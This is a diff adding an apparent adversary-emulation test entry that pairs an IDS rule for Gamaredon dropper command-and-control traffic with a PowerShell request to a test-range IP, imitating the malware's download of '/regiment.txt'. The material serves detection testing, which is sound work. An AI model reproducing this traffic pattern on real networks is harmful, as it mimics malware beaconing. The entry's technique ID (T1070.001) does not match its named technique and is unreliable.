@@ -1,0 +1,36 @@
+- tactic: command-and-control
+  technique_name: 'Application Layer Protocol: Web Protocols'
+  technique_id: T1070.001
+  name: 'Intrusion: Gamaredon CNC Lnk Dropper'
+  description: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:"MALWARE-CNC
+    Lnk.Dropper.Gamaredon malicious download attempt"; flow:to_server,established;
+    http_uri; content:"/regiment.txt",fast_pattern,nocase; http_header; content:"UA-CPU:
+    AMD64"; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips
+    drop,policy security-ips drop; service:http; reference:url,virustotal.com/en/file/ff7e8580ce6df5d5f5a2448b4646690a6f6d66b1db37f887b451665f4115d1a2/analysis/;
+    classtype:trojan-activity; gid:1; sid:60530; rev:1; )'
+  executors:
+  - name: psh
+    platform: windows
+    command: Invoke-WebRequest -Uri "http://198.18.128.192:80/regiment.txt" -Headers
+      @{ "UA-CPU" = "AMD64" } -Method GET
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - command-and-control
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 516fbd0b-1e28-4964-a221-a90828d0b3aa
